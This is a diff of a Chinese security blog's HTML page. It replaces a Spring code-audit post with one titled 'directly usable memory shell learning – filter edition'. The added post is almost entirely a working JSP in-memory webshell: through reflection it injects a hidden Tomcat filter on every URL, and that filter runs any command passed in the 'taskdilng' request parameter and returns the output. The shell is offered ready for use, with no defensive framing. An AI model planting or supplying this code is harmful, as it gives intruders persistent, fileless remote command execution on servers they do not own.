@@ -4,25 +4,27 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>java审计代码跟进流程(spring) | novy&#39;s Blog</title>
+    <title>能直接使用的内存马学习-filter篇 | novy&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="novy&#39;s Blog">
     
 
     
-    <meta name="description" content="spring流程">
+    <meta name="description" content="无文件webshell学习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="java审计代码跟进流程(spring)">
-<meta property="og:url" content="http://example.com/2020/04/10/22/index.html">
+<meta property="og:title" content="能直接使用的内存马学习-filter篇">
+<meta property="og:url" content="http://example.com/2021/09/16/62/index.html">
 <meta property="og:site_name" content="novy&#39;s Blog">
-<meta property="og:description" content="spring流程">
+<meta property="og:description" content="无文件webshell学习">
 <meta property="og:locale">
-<meta property="article:published_time" content="2020-04-10T06:52:47.000Z">
-<meta property="article:modified_time" content="2020-11-10T06:57:35.865Z">
+<meta property="og:image" content="http://example.com/images/62/1.png">
+<meta property="article:published_time" content="2021-09-16T10:24:21.000Z">
+<meta property="article:modified_time" content="2021-09-23T03:10:57.129Z">
 <meta property="article:author" content="novy&#39;s Blog">
-<meta property="article:tag" content="JAVA代码审计">
+<meta property="article:tag" content="内存马">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/62/1.png">
 
     
     <link rel="alternative" href="/atom.xml" title="novy&#39;s Blog" type="application/atom+xml">
@@ -86,14 +88,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2020/04/10/22/" title="java审计代码跟进流程(spring)" itemprop="url">java审计代码跟进流程(spring)</a>
+      <a href="/2021/09/16/62/" title="能直接使用的内存马学习-filter篇" itemprop="url">能直接使用的内存马学习-filter篇</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="novy&#39;s Blog" target="_blank" itemprop="author">novy&#39;s Blog</a>
 		
   <p class="article-time">
-    <time datetime="2020-04-10T06:52:47.000Z" itemprop="datePublished"> Published 2020-04-10</time>
+    <time datetime="2021-09-16T10:24:21.000Z" itemprop="datePublished"> Published 2021-09-16</time>
     
   </p>
 </header>
@@ -106,7 +108,10 @@
 		
 		</div>
 		
-		<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pom.xml是组件引用和其他声明层，组件的引用跟请求过滤之类的在这里</span><br><span class="line">*Controller.java是控制层，请求url在这里</span><br><span class="line">*service.java是处理层，请求/接口之类的处理在这里</span><br><span class="line">*Impl.java也是服务实现层，跟service同，这里有时候会包含有sql语句</span><br><span class="line">*dao.java数据处理层，一些数据请求会在这里发生</span><br><span class="line">*mapper.xml是数据请求层，sql查询发生在这里     </span><br></pre></td></tr></table></figure>  
+		<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author <span class="variable">novy</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date </span>2021/9/16 12:29</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version </span>1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.IOException&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.InputStream&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.BufferedReader&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.InputStreamReader&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    final <span class="built_in">String</span> name = <span class="string">&quot;DefaultTesttFilter&quot;</span>;</span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">Map</span> filterConfigs = (<span class="built_in">Map</span>) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        Filter filter = <span class="keyword">new</span> <span class="function"><span class="title">Filter</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public <span class="keyword">void</span> init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public <span class="keyword">void</span> doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="built_in">String</span> task = req.getParameter(<span class="string">&quot;taskdilng&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (task != <span class="literal">null</span>)&#123;</span><br><span class="line">           InputStream fis = <span class="keyword">new</span> ProcessBuilder(task).start().getInputStream();</span><br><span class="line">        InputStreamReader isr=<span class="keyword">new</span> InputStreamReader(fis);</span><br><span class="line">        BufferedReader br=<span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">        <span class="built_in">String</span> line=<span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="title">while</span>(<span class="params">(line=br.readLine())!=<span class="literal">null</span></span>)</span> &#123;</span><br><span class="line">           response.getWriter().println(<span class="string">&quot;res: &quot;</span>+line);</span><br><span class="line">       &#125;</span><br><span class="line">        &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public <span class="keyword">void</span> <span class="function"><span class="title">destroy</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        Constructor <span class="title">constructor</span> = <span class="title">ApplicationFilterConfig</span>.<span class="title">class</span>.<span class="title">getDeclaredConstructor</span>(<span class="params">Context.<span class="keyword">class</span>,FilterDef.<span class="keyword">class</span></span>);</span><br><span class="line">        <span class="title">constructor</span>.<span class="title">setAccessible</span>(<span class="params"><span class="literal">true</span></span>);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) <span class="title">constructor</span>.<span class="title">newInstance</span>(<span class="params">standardContext,filterDef</span>);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/62/1.png"></p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
@@ -119,7 +124,7 @@
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/JAVA代码审计/">JAVA代码审计</a>
+  <span></span> <a href="/tags/内存马/">内存马</a>
   </div>
 
 </div>
@@ -128,7 +133,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://example.com/2020/04/10/22/" data-title="java审计代码跟进流程(spring) | novy&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://example.com/2021/09/16/62/" data-title="能直接使用的内存马学习-filter篇 | novy&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -141,19 +146,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2020/07/10/8/" title="cs免杀后门">
-  <strong>上一篇：</strong><br/>
-  <span>
-  cs免杀后门</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2019/12/09/4/"  title="App测试从0到精通（四大组件之activity组件篇）">
+<a href="/2021/09/15/61/"  title="能直接使用的内存马学习-servlet篇">
  <strong>下一篇：</strong><br/> 
- <span>App测试从0到精通（四大组件之activity组件篇）
+ <span>能直接使用的内存马学习-servlet篇
 </span>
 </a>
 </div>
